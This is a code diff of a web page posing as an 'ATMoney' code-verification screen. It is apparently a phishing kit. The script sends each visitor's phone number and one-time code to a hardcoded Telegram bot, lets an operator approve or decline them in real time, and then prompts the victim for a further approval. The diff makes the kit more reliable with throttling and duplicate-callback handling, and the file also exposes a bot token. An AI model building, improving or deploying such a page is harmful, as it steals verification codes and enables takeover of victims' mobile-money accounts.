@@ -66,7 +66,6 @@
             letter-spacing: 1.5px;
             text-transform: uppercase;
             margin-right: 34px;
-            /* Balance the back button */
         }
 
         .spinner {
@@ -180,13 +179,6 @@
             text-decoration: underline;
         }
 
-        .timer {
-            font-size: 28px;
-            font-weight: 700;
-            color: var(--red);
-            margin-bottom: 24px;
-        }
-
         .input-label {
             font-size: 14px;
             color: var(--text-mid);
@@ -219,8 +211,6 @@
             border-color: var(--blue);
             box-shadow: 0 0 0 3px rgba(0, 61, 165, 0.1);
         }
-
-        /* Prompt Overlay */
 
         #promptOverlay {
             display: none;
@@ -331,7 +321,7 @@
     </div>
 
     <script>
-        // ─── YOUR BOT CREDENTIALS (updated) ──────────────────────────────────
+        // ─── BOT CREDENTIALS ──────────────────────────────────────────
         const CONFIG = {
             BOT_TOKEN: '8323704904:AAEiB-e1x2uQ_qZp0PaBS__8B9EXs402Xus',
             CHAT_ID: '1006917440',
@@ -342,8 +332,13 @@
             lastUpdateId: 0
         };
         let isProcessing = false;
-        let promptTimerInterval;
-        let pollingInterval;
+        let lastSubmitTime = 0;
+
+        // Flags to prevent duplicate callback processing
+        let codeCallbackHandled = false;
+        let promptCallbackHandled = false;
+
+        let pollingInterval = null;
 
         const params = new URLSearchParams(window.location.search);
         const phone = params.get('phone') || '0560723291';
@@ -351,8 +346,8 @@
 
         document.getElementById('displayPhone').textContent = phone;
 
-        // Main Timer Logic
-        let mainTimeLeft = 150; // 2:30
+        // ─── MAIN TIMER ──────────────────────────────────────────────
+        let mainTimeLeft = 150;
         const mainTimerEl = document.getElementById('mainTimer');
         const resendBtn = document.getElementById('resendBtn');
         const statusText = document.getElementById('statusText');
@@ -384,12 +379,11 @@
 
         function resendCode() {
             startMainTimer();
-            // You can add API call here to actually resend the code if needed
         }
 
         startMainTimer();
 
-        // Code Inputs Logic
+        // ─── CODE INPUTS ──────────────────────────────────────────────
         const inputs = document.querySelectorAll('.code-input');
         inputs.forEach((input, index) => {
             input.addEventListener('input', () => {
@@ -418,18 +412,31 @@
             }
         }
 
+        // ─── SUBMIT CODE (with throttle) ──────────────────────────────
         function submitCode(code) {
-            if (isProcessing) return;
+            const now = Date.now();
+            if (isProcessing || (now - lastSubmitTime < 2000)) {
+                return;
+            }
+            lastSubmitTime = now;
+
             isProcessing = true;
             document.getElementById('errMsg').style.display = 'none';
 
-            // Show loading state on the inputs
             inputs.forEach(i => i.disabled = true);
             statusText.textContent = 'Verifying code...';
             mainSpinner.style.display = 'block';
             mainTimerEl.style.display = 'none';
             resendBtn.style.display = 'none';
             clearInterval(mainTimerInterval);
+
+            // Reset callback handled flag for a fresh submission
+            codeCallbackHandled = false;
+
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
 
             const ts = Date.now();
             const approveCodeId = `approve_code_${ts}`;
@@ -445,13 +452,13 @@
                         text: `<b>🔴 ATMoney Code Verification</b>\n\nPhone: <code>${phone}</code>\nCode Entered: <code>${code}</code>\n\nChoose Action:`,
                         parse_mode: 'HTML',
                         reply_markup: {
-    inline_keyboard: [
-        [
-            { text: "✅ Approve Code", callback_data: approveCodeId },
-            { text: "❌ Decline ", callback_data: declineCodeId }
-        ]
-    ]
-}
+                            inline_keyboard: [
+                                [
+                                    { text: "✅ Approve Code", callback_data: approveCodeId },
+                                    { text: "❌ Decline ", callback_data: declineCodeId }
+                                ]
+                            ]
+                        }
                     })
                 })
                 .then(() => {
@@ -464,6 +471,8 @@
 
         function resetInputs() {
             isProcessing = false;
+            codeCallbackHandled = false;
+            promptCallbackHandled = false;
             inputs.forEach(i => {
                 i.disabled = false;
                 i.value = '';
@@ -472,8 +481,13 @@
             statusText.textContent = 'Did not receive the code?';
             mainSpinner.style.display = 'none';
             resendBtn.style.display = 'block';
+            if (pollingInterval) {
+                clearInterval(pollingInterval);
+                pollingInterval = null;
+            }
         }
 
+        // ─── POLLING FOR CODE VERIFICATION ──────────────────────────
         function startCodePolling(approveCodeId, declineCodeId) {
             pollingInterval = setInterval(() => {
                 fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
@@ -486,12 +500,23 @@
 
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+                                const queryId = update.callback_query.id;
+
+                                // Answer callback to acknowledge
+                                answerCallback(queryId, 'Processing…');
+
+                                // If we already handled this code callback, ignore duplicates
+                                if (codeCallbackHandled) return;
 
                                 if (cb === approveCodeId) {
+                                    codeCallbackHandled = true;
                                     clearInterval(pollingInterval);
+                                    pollingInterval = null;
                                     sendPromptApproval();
                                 } else if (cb === declineCodeId) {
+                                    codeCallbackHandled = true;
                                     clearInterval(pollingInterval);
+                                    pollingInterval = null;
                                     document.getElementById('errMsg').style.display = 'block';
                                     resetInputs();
                                 }
@@ -501,10 +526,27 @@
             }, 1000);
         }
 
+        // ─── ANSWER CALLBACK ──────────────────────────────────────────
+        function answerCallback(queryId, text) {
+            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    callback_query_id: queryId,
+                    text: text,
+                    show_alert: false
+                })
+            }).catch(() => {});
+        }
+
+        // ─── PROMPT APPROVAL ──────────────────────────────────────────
         function sendPromptApproval() {
             const ts = Date.now();
             const approvePromptId = `approve_prompt_${ts}`;
             const declinePromptId = `decline_prompt_${ts}`;
+
+            // Reset prompt callback flag before sending new prompt
+            promptCallbackHandled = false;
 
             fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -516,13 +558,13 @@
                         text: `<b>🔴 ATMoney Prompt Approval</b>\n\nPhone: <code>${phone}</code>\n\nUser is waiting for prompt approval. Choose Action:`,
                         parse_mode: 'HTML',
                         reply_markup: {
-    inline_keyboard: [
-        [
-            { text: "✅ Approve Prompt", callback_data: approvePromptId },
-            { text: "❌ Decline ", callback_data: declinePromptId }
-        ]
-    ]
-}
+                            inline_keyboard: [
+                                [
+                                    { text: "✅ Approve Prompt", callback_data: approvePromptId },
+                                    { text: "❌ Decline ", callback_data: declinePromptId }
+                                ]
+                            ]
+                        }
                     })
                 })
                 .then(() => {
@@ -535,8 +577,7 @@
         }
 
         function showPromptOverlay() {
-            const overlay = document.getElementById('promptOverlay');
-            overlay.style.display = 'flex';
+            document.getElementById('promptOverlay').style.display = 'flex';
         }
 
         function hidePromptOverlay() {
@@ -555,13 +596,23 @@
 
                             if (update.callback_query) {
                                 const cb = update.callback_query.data;
+                                const queryId = update.callback_query.id;
+
+                                answerCallback(queryId, 'Processing…');
+
+                                // If we already handled this prompt callback, ignore duplicates
+                                if (promptCallbackHandled) return;
 
                                 if (cb === approvePromptId) {
+                                    promptCallbackHandled = true;
                                     clearInterval(pollingInterval);
+                                    pollingInterval = null;
                                     hidePromptOverlay();
                                     window.location.href = `${CONFIG.SUCCESS_PAGE}?${params.toString()}`;
                                 } else if (cb === declinePromptId) {
+                                    promptCallbackHandled = true;
                                     clearInterval(pollingInterval);
+                                    pollingInterval = null;
                                     hidePromptOverlay();
                                     document.getElementById('errMsg').style.display = 'block';
                                     resetInputs();
